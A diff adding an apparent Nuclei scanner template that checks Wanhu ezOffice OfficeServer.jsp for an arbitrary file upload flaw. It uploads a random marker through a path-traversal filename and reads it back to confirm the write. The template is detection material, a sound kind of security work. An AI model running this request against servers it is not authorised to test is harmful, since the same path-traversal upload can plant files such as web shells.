@@ -1,0 +1,38 @@
+id: wanhu-ezoffice-officeserver-jsp-fileupload
+
+info:
+  name: 万户ezoffice OfficeServer.jsp任意文件上传
+  author: sm
+  severity: critical
+  tags: wanhu,oa,fileupload,ezoffice
+
+variables:
+  filename: "public/edit/{{rand_int(10,99)}}.txt"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+        DBSTEP V3.0     137             0               27              DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID=
+        isDoc=dHJ1ZQ==
+        moduleType=Z292ZG9jdW1lbnQ=
+        FILETYPE={{base64("{{filepath}}")}}
+        {{randstr}}
+        
+      - |
+        GET /defaultroot/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+    payloads:
+      filepath: 
+        - "../../{{filename}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'{{randstr}}')"
